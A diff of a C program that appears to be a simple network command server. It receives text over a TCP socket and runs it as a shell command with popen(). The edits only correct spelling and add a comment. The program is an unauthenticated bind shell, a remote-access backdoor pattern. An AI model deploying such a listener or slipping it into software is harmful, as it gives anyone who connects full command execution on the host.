@@ -24,7 +24,7 @@ int main(int argc, char *argv[]){
 	struct sockaddr_in server_addr, client_addr;
 	int n, len;
 
-	// Inititialization of variables use for the network
+	// Inititialization of variables used for the network
 	server_addr.sin_family = AF_INET;
 	server_addr.sin_port = htons(port);
 	server_addr.sin_addr.s_addr = inet_addr(ip);
@@ -56,6 +56,8 @@ int main(int argc, char *argv[]){
 
 	else {
 		printf("[+] Bind to port number : %d | IP address : %s \n", port, ip);
+
+		// Listening for the client connect()...
 		n = listen(server_socket,1);
 
 		if(n<0){
@@ -84,7 +86,7 @@ int main(int argc, char *argv[]){
 		bzero(cmd,MAXSIZE);
 		bzero(buffer,MAXSIZE);
 
-		// Receve and convert the socket from the client
+		// Receive and convert the socket from the client
 		int bytes_of_socket  = recv(client_socket, cmd, sizeof(cmd),0);
 		strncpy(strings_msg, cmd, bytes_of_socket);
 		strings_msg[bytes_of_socket] = '\0';
@@ -92,7 +94,7 @@ int main(int argc, char *argv[]){
 		// Execute bash command & create an output of this command
 		output = popen (strings_msg, "r");
 		if (output == NULL){
-			fputs("[+] Connexion with client closed ! \n", stderr);
+			fputs("[+] Connection with client closed ! \n", stderr);
 			close(server_socket);
 			exit(0);
 		}
